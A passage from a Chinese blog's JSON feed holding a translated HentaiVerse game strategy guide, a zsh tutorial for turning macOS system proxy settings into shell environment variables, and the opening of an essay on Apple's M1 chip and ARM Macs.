href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 